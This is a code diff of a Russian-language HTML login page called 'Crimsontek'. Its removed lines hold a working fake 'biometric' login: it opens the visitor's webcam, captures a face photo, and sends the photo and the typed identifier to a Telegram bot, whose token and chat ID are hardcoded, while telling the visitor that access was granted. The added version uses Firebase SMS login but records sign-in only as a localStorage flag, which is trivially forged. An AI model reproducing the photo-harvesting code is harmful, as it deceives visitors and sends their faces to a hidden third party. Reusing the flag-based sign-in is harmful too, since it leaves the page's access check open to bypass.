@@ -1,148 +1,68 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Вход в систему • Crimsontek</title>
-  <link rel="stylesheet" href="styles.css">
-  <style>
-    .card {
-      background: #1a1a1a;
-      border: 3px solid #ff0000;
-      border-radius: 8px;
-      padding: 35px 25px;
-      max-width: 540px;
-      margin: 40px auto;
-    }
-    input {
-      width: 100%;
-      padding: 18px;
-      margin: 20px 0;
-      background: #111;
-      border: 2px solid #ff0000;
-      color: white;
-      font-size: 1.15rem;
-      text-align: center;
-    }
-    button {
-      width: 100%;
-      padding: 18px;
-      margin: 12px 0;
-      font-size: 1.15rem;
-      font-weight: bold;
-      text-transform: uppercase;
-      background: #ff0000;
-      color: white;
-      border: none;
-    }
-    button:hover {
-      background: #ff3333;
-    }
-    #video {
-      width: 100%;
-      border: 3px solid #ff0000;
-      border-radius: 6px;
-      margin: 20px 0;
-      background: #000;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRIMSONTEK // AUTH</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+    <style>
+        body { background: #050505; color: #ff0000; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .auth-card { border: 2px solid #f00; padding: 30px; background: #000; text-align: center; width: 320px; box-shadow: 0 0 20px #500; }
+        input { width: 100%; padding: 12px; margin: 15px 0; background: #111; border: 1px solid #f00; color: #fff; text-align: center; }
+        button { width: 100%; padding: 12px; background: #f00; color: #fff; border: none; font-weight: bold; cursor: pointer; }
+        #recaptcha-container { margin-top: 10px; }
+    </style>
 </head>
 <body>
-  <header>
-    <div class="logo" style="font-size:2.8rem; color:#ff0000; text-align:center; font-weight:900;">CRIMSONTEK</div>
-  </header>
-
-  <div class="card">
-    <h2 style="color:#ff0000; text-align:center; margin-bottom:25px;">ДОСТУП К СИСТЕМЕ</h2>
-    
-    <input type="text" id="username" placeholder="ВВЕДИТЕ ИДЕНТИФИКАТОР" maxlength="30">
-
-    <button onclick="startVerification()">ПОДКЛЮЧИТЬ НЕЙРОСКАНЕР</button>
-
-    <div id="camera-container" style="display:none;">
-      <p style="color:#ff0000; text-align:center; margin:20px 0;">СИСТЕМА ТРЕБУЕТ БИОМЕТРИЧЕСКОЕ ПОДТВЕРЖДЕНИЕ</p>
-      <video id="video" autoplay playsinline muted></video>
-      <button onclick="takePhoto()">СКАНИРОВАТЬ ЛИЦО</button>
-      <button onclick="cancelVerification()" style="background:#444;">ОТМЕНИТЬ</button>
+    <div class="auth-card">
+        <h2 style="letter-spacing: 2px;">IDENTIFICATION</h2>
+        <div id="step-1">
+            <input type="tel" id="phone" placeholder="+7 707 000 0000">
+            <div id="recaptcha-container"></div>
+            <button onclick="sendSMS()">ПОЛУЧИТЬ КОД</button>
+        </div>
+        <div id="step-2" style="display:none;">
+            <input type="text" id="code" placeholder="КОД ИЗ SMS">
+            <button onclick="verifySMS()">ПОДТВЕРДИТЬ</button>
+        </div>
+        <p id="status" style="font-size: 0.7rem; color: #555; margin-top: 15px;"></p>
     </div>
 
-    <div id="status"></div>
-  </div>
+    <script>
+        // ВСТАВЬ СВОЙ CONFIG ИЗ FIREBASE НИЖЕ
+        const firebaseConfig = {
+            apiKey: "ТВОЙ_API_KEY",
+            authDomain: "ТВОЙ_PROJECT.firebaseapp.com",
+            projectId: "ТВОЙ_PROJECT_ID",
+            storageBucket: "ТВОЙ_PROJECT.appspot.com",
+            messagingSenderId: "ID",
+            appId: "APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
 
-  <script>
-    const BOT_TOKEN = "8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0";
-    const CHAT_ID = "7616949660";
-    let stream = null;
-
-    function showStatus(text, color = "#fff") {
-      document.getElementById("status").innerHTML = `<span style="color:${color}">${text}</span>`;
-    }
-
-    async function startVerification() {
-      const username = document.getElementById("username").value.trim();
-      if (!username) {
-        showStatus("Введите идентификатор!", "orange");
-        return;
-      }
-
-      document.getElementById("camera-container").style.display = "block";
-      showStatus("Запуск камеры...", "#ccc");
-
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        document.getElementById("video").srcObject = stream;
-        showStatus("Камера запущена.<br>Нажмите «СКАНИРОВАТЬ ЛИЦО»", "lime");
-      } catch (err) {
-        showStatus("Не удалось получить доступ к камере.<br>Разрешите камеру в настройках браузера", "red");
-      }
-    }
-
-    async function takePhoto() {
-      const username = document.getElementById("username").value.trim();
-      const video = document.getElementById("video");
-
-      if (!video.srcObject) {
-        showStatus("Камера не запущена", "red");
-        return;
-      }
-
-      showStatus("Отправка фото...", "orange");
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      const blob = await fetch(canvas.toDataURL("image/jpeg", 0.75)).then(r => r.blob());
-
-      const formData = new FormData();
-      formData.append("chat_id", CHAT_ID);
-      formData.append("caption", `🛡️ Новый вход\nID: ${username}\nВремя: ${new Date().toLocaleString('ru-RU')}`);
-
-      formData.append("photo", blob, "face.jpg");
-
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
-        });
-
-        if (res.ok) {
-          showStatus(`ДОСТУП РАЗРЕШЁН<br>ДОБРО ПОЖАЛОВАТЬ, ${username.toUpperCase()}`, "lime");
-          setTimeout(() => window.location.href = "success.html", 1800);
-        } else {
-          showStatus("Ошибка отправки в Telegram", "red");
+        function sendSMS() {
+            const phoneNumber = document.getElementById('phone').value;
+            window.recaptchaVerifier = new firebase.auth.RecaptchaVerifier('recaptcha-container', { 'size': 'invisible' });
+            auth.signInWithPhoneNumber(phoneNumber, window.recaptchaVerifier)
+                .then(result => {
+                    window.confirmationResult = result;
+                    document.getElementById('step-1').style.display = 'none';
+                    document.getElementById('step-2').style.display = 'block';
+                    document.getElementById('status').innerText = "СМС ОТПРАВЛЕНО";
+                }).catch(err => { document.getElementById('status').innerText = "ОШИБКА: " + err.message; });
         }
-      } catch (e) {
-        showStatus("Ошибка соединения", "red");
-      }
-    }
 
-    function cancelVerification() {
-      if (stream) stream.getTracks().forEach(track => track.stop());
-      document.getElementById("camera-container").style.display = "none";
-      showStatus("");
-    }
-  </script>
+        function verifySMS() {
+            const code = document.getElementById('code').value;
+            confirmationResult.confirm(code).then(result => {
+                localStorage.setItem('crimson_auth', 'true');
+                localStorage.setItem('user_phone', result.user.phoneNumber);
+                window.location.href = 'success.html'; 
+            }).catch(err => { alert("НЕВЕРНЫЙ КОД"); });
+        }
+    </script>
 </body>
 </html>
